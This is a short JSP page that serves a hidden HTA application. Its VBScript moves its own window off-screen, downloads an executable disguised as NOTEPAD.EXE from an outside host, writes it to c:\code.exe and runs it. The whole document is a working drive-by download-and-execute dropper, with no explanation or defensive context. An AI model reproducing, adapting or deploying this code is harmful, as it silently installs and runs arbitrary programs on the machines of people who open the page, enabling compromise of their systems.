
<% response.setContentType("application/hta"); %> 
 
<HTA:APPLICATION ID="oMyApp" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"> 
 
<script language="vbscript"> 
 
    self.MoveTo 5000,5000 
 
    payload = "http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE" 
    target = "c:\\code.exe" 
 
    const ForWriting = 2 
 
    set xmlHTTP = CreateObject("Microsoft.XMLHTTP") 
    xmlHTTP.open "GET", payload, false 
    xmlHTTP.send 
    contents = xmlHTTP.responseBody 
 
    Set fso = CreateObject("Scripting.FileSystemObject") 
    Set f = fso.CreateTextFile(target, ForWriting) 
 
    for i = 0 to UBound(contents) 
        thischarcode = ascb(midb(contents, i+1, 1)) 
        f.Write chr(thischarcode) 
    next 
 
    f.close 
 
    Set shell=CreateObject("WScript.Shell") 
    shell.run(target) 
 
</script> 



